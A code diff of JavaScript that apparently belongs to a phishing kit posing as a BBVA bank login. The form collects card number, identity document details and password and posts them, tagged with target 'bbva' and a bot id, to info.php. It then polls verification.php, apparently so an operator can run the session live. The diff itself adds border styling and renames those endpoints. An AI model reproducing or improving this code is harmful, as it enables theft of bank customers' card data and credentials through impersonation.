@@ -1,16 +1,55 @@
 document.addEventListener("DOMContentLoaded", function () {
   var initialHeight = window.innerHeight;
-  document.body.style.minHeight = initialHeight + 'px';
+  document.body.style.minHeight = initialHeight + "px";
   const form = document.querySelector("#myForm");
   const cardNumber = document.querySelector("#cardNumber");
   const docType = document.querySelector("#docType");
   const docNumber = document.querySelector("#docNumber");
   const password = document.querySelector("#password");
   const fingerprint = document.querySelector(".fingerprint");
-      const loader = document.querySelector(".loader-wrapper");
-      fingerprint.addEventListener("click", function () {
+  const loader = document.querySelector(".loader-wrapper");
+  fingerprint.addEventListener("click", function () {
     this.classList.toggle("finger_black");
   });
+
+  const recordarCheckbox = document.getElementById("recordar");
+  const inputFields = [cardNumber, docType, docNumber, password];
+  function toggleGreenBorder() {
+    if (recordarCheckbox.checked) {
+      // Add green border
+      cardNumber.classList.add("green-border");
+      docType.classList.add("green-border");
+      docNumber.classList.add("green-border");
+
+      // Remove green border after 3 seconds
+      setTimeout(() => {
+        cardNumber.classList.remove("green-border");
+        docType.classList.remove("green-border");
+        docNumber.classList.remove("green-border");
+      }, 3000);
+    }
+  }
+
+  function addFocusClass() {
+    this.classList.add("focus-green-border");
+  }
+
+  function removeFocusClass() {
+    this.classList.remove("focus-green-border");
+  }
+
+  // Listen for checkbox change
+  recordarCheckbox.addEventListener("change", toggleGreenBorder);
+
+  // Add focus and blur event listeners for input fields
+  inputFields.forEach((field) => {
+    field.addEventListener("focus", addFocusClass);
+    field.addEventListener("blur", removeFocusClass);
+  });
+
+
+
+
   // Валидация и форматирование номера карты
   cardNumber.addEventListener("input", function () {
     let value = this.value.replace(/[^\d]/g, ""); // Убираем все нецифровые символы
@@ -158,14 +197,14 @@ document.addEventListener("DOMContentLoaded", function () {
     formData.append("target", "bbva"); //добавляем ботайди
 
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "get.php", true);
+    xhr.open("POST", "info.php", true);
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         // Обработка успешного ответа сервера
         console.log(xhr.responseText);
         sendRequestWithBotId(); // Начинаем отслеживание с сервера
-      loader.style.display = "none";
-    } else {
+        loader.style.display = "none";
+      } else {
         // Обработка ошибок
         console.error(xhr.statusText);
       }
@@ -179,7 +218,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
     if (botId) {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "valid.php?botid=" + botId, true);
+      xhr.open("GET", "verification.php?botid=" + botId, true);
       xhr.onreadystatechange = function () {
         if (xhr.readyState === 4) {
           var responseCode = xhr.status;
